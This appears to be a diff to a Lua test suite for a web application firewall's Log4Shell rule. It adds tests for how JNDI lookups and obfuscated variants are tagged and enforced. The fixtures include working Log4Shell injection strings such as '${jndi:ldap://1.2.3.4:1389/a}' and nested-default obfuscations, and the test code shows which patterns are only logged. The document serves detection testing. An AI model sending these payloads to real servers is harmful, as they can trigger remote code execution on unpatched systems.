@@ -1799,7 +1799,7 @@ do
   waf.set_rule("rule_log4shell", "challenge")
 
   local cases = {
-    { args = "x=${env:FOO:-j}ndi:ldap://e/a",            expect = "ENV"         },
+    { args = "x=${env:FOO}",                             expect = "ENV"         },
     { args = "x=${sys:user.home}",                       expect = "SYS"         },
     { args = "x=${main:0}",                              expect = "MAIN"        },
     { args = "x=${date:yyyy}",                           expect = "DATE"        },
@@ -1816,6 +1816,109 @@ do
     check(waf_rule_id == 328,
           "74a/" .. c.expect .. ": rule_id=328")
   end
+end
+
+-- ── Test 74b: rule_log4shell at challenge_v2 — only the Log4Shell tags bite ─
+-- 2026-11-01: 328 ships at challenge_v2, but the template-shaped tags (NESTED,
+-- ENV, SYS, MAIN, DATE, BASE64) stay logonly at any mode: WAF_CVE is high-risk
+-- and armed, so a cleared customer's challenge-tier hit is a 403 and a ban.
+do
+  disable_all_rules()
+  waf.set_rule("rule_log4shell", "challenge_v2")
+
+  -- The fleet's real hits: JNDI in X-Api-Version / Referer from a scanner.
+  local hit, reason, _ttl, action, _hits, rid = waf.check(fresh_ctx({
+    headers = { ["x-api-version"] = "${jndi:ldap://1.2.3.4:1389/a}",
+                ["user-agent"] = "Mozilla/5.0 (compatible; scanner/1.0)" },
+  }))
+  check(hit == true and rid == 328,                              "74b: JNDI header — hit 328")
+  check(reason == "WAF_CVE:LOG4SHELL:JNDI:HDR:x-api-version",    "74b: JNDI header — tag (got " .. tostring(reason) .. ")")
+  check(action == "challenge_v2",                                "74b: JNDI header — challenge_v2 (got " .. tostring(action) .. ")")
+
+  -- The classic nested default-value payload is DEFAULT_VAL, not NESTED, so
+  -- it is enforced (in args/body and in a header).
+  local _, r1, _, a1 = waf.check(fresh_ctx({ args = "x=${${::-j}${::-n}${::-d}${::-i}:ldap://e/a}" }))
+  check(r1 == "WAF_CVE:LOG4SHELL:DEFAULT_VAL",                   "74b: ${${::-j} args — DEFAULT_VAL (got " .. tostring(r1) .. ")")
+  check(a1 == "challenge_v2",                                    "74b: ${${::-j} args — challenge_v2 (got " .. tostring(a1) .. ")")
+  local _, r2, _, a2 = waf.check(fresh_ctx({ headers = { ["user-agent"] = "${${lower:j}ndi:ldap://e/a}" } }))
+  check(r2 == "WAF_CVE:LOG4SHELL:LOWER:HDR:user-agent",          "74b: ${${lower:j} header — LOWER (got " .. tostring(r2) .. ")")
+  check(a2 == "challenge_v2",                                    "74b: ${${lower:j} header — challenge_v2 (got " .. tostring(a2) .. ")")
+  local _, _, _, a3 = waf.check(fresh_ctx({ args = "x=${upper:J}ndi:ldap://e/a" }))
+  check(a3 == "challenge_v2",                                    "74b: UPPER — challenge_v2 (got " .. tostring(a3) .. ")")
+
+  -- Lookups that RESOLVE to a jndi lookup (defaults with any name length,
+  -- quoted date literals, case conversions nested inside) are RESOLVED.
+  local long = ("a"):rep(200)
+  local resolved = {
+    { args = "x=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://e/a}", want = "WAF_CVE:LOG4SHELL:RESOLVED" },
+    { headers = { ["user-agent"] = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:RESOLVED:HDR:user-agent" },
+    { headers = { ["user-agent"] = "${${env:" .. long .. ":-j}ndi:ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:RESOLVED:HDR:user-agent" },
+    { headers = { ["x-api-version"] = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:RESOLVED:HDR:x-api-version" },
+    { args = "x=${${sys:x:-j}${sys:x:-n}di:ldap://e/a}",            want = "WAF_CVE:LOG4SHELL:RESOLVED" },
+    { args = "x=${${env:a:-${env:b:-j}}ndi:ldap://e/a}",           want = "WAF_CVE:LOG4SHELL:RESOLVED" },
+  }
+  for i, c in ipairs(resolved) do
+    local _, r, _, a = waf.check(fresh_ctx({ args = c.args, headers = c.headers }))
+    check(r == c.want and a == "challenge_v2", "74b/resolved " .. i .. ": " .. c.want .. " challenge_v2 (got " .. tostring(r) .. " " .. tostring(a) .. ")")
+  end
+  -- Template / shell defaults resolve to plain text: not enforced. A glued
+  -- default with no outer ${ spells "jndi:" but no lookup: weak too.
+  for _, v in ipairs({ "x=${env:HOME:-/root}", "x=echo ${1:-x} done", "x=${sys:p:-8080}",
+                       "x=echo ${PREFIX:-/}usr/bin", "x=${env:FOO:-j}ndi:ldap://e/a",
+                       "tpl=`${${item}.name}`" }) do
+    local _, r, _, a = waf.check(fresh_ctx({ args = v }))
+    check(a == nil or a == "logonly", "74b: " .. v .. " — not enforced (got " .. tostring(r) .. " " .. tostring(a) .. ")")
+  end
+  -- The unwrap is bounded (LOOKUP_PASSES = 8): a `j` 7 defaults deep still
+  -- resolves (7 + the jndi pass); one 9 deep runs out of passes with lookups
+  -- still nested, which is DEEP (enforced), not a pass.
+  local function nest(depth)
+    local inner = "j"
+    for _ = 1, depth do inner = "${env:a:-" .. inner .. "}" end
+    return "x=${" .. inner .. "ndi:ldap://e/a}"
+  end
+  local _, r7, _, a7 = waf.check(fresh_ctx({ args = nest(7) }))
+  check(r7 == "WAF_CVE:LOG4SHELL:RESOLVED" and a7 == "challenge_v2", "74b: 7 deep resolves (got " .. tostring(r7) .. " " .. tostring(a7) .. ")")
+  local _, r9, _, a9 = waf.check(fresh_ctx({ args = nest(9) }))
+  check(r9 == "WAF_CVE:LOG4SHELL:DEEP" and a9 == "challenge_v2", "74b: 9 deep — DEEP challenge_v2 (got " .. tostring(r9) .. " " .. tostring(a9) .. ")")
+  -- Many flat lookups (a long template) are not deep.
+  local _, rf, _, af = waf.check(fresh_ctx({ args = "x=" .. ("${env:a} "):rep(50) }))
+  check(rf == "WAF_CVE:LOG4SHELL:ENV" and af == "logonly", "74b: 50 flat lookups — ENV logonly (got " .. tostring(rf) .. " " .. tostring(af) .. ")")
+
+  -- A weak tag elsewhere in the request must not mask a strong one.
+  local mixed = {
+    { args = "q=${date:yyyy}", headers = { ["x-api-version"] = "${jndi:ldap://e/a}" },
+      want = "WAF_CVE:LOG4SHELL:JNDI:HDR:x-api-version" },
+    { headers = { ["referer"] = "${date:x}", ["x-api-version"] = "${jndi:ldap://e/a}",
+                  ["x-b"] = "${env:A}", ["x-c"] = "${base64:Zm9v}" },
+      want = "WAF_CVE:LOG4SHELL:JNDI:HDR:x-api-version" },
+    { args = "a=${${x}}&b=${upper:J}ndi:ldap://e/a", want = "WAF_CVE:LOG4SHELL:UPPER" },
+  }
+  for i, c in ipairs(mixed) do
+    local _, r, _, a = waf.check(fresh_ctx({ args = c.args, headers = c.headers }))
+    check(r == c.want and a == "challenge_v2", "74b/mixed " .. i .. ": " .. c.want .. " (got " .. tostring(r) .. " " .. tostring(a) .. ")")
+  end
+
+  -- Template-shaped tags: recorded, never enforced.
+  local held = {
+    { args = "tpl=`${${item}.name}`",   tag = "NESTED" },
+    { args = "x=${env:HOME}",           tag = "ENV"    },
+    { args = "x=${sys:user.home}",      tag = "SYS"    },
+    { args = "x=${main:0}",             tag = "MAIN"   },
+    { args = "x=${date:yyyy-MM-dd}",    tag = "DATE"   },
+    { args = "x=${base64:Zm9v}",        tag = "BASE64" },
+  }
+  for _, c in ipairs(held) do
+    local h, r, _, a, _, id = waf.check(fresh_ctx({ args = c.args }))
+    check(h == true and id == 328,                               "74b/" .. c.tag .. ": still recorded")
+    check(r == "WAF_CVE:LOG4SHELL:" .. c.tag,                    "74b/" .. c.tag .. ": tag (got " .. tostring(r) .. ")")
+    check(a == "logonly",                                        "74b/" .. c.tag .. ": logonly at challenge_v2 (got " .. tostring(a) .. ")")
+  end
+  local _, rh, _, ah = waf.check(fresh_ctx({ headers = { ["x-a"] = "${date:}" } }))
+  check(rh == "WAF_CVE:LOG4SHELL:DATE:HDR:x-a" and ah == "logonly", "74b: DATE header — logonly (got " .. tostring(rh) .. " " .. tostring(ah) .. ")")
 end
 
 -- ── Test 75: rule_bad_utf8 — 2-byte overlong (0xC0 lead) ───────────────────
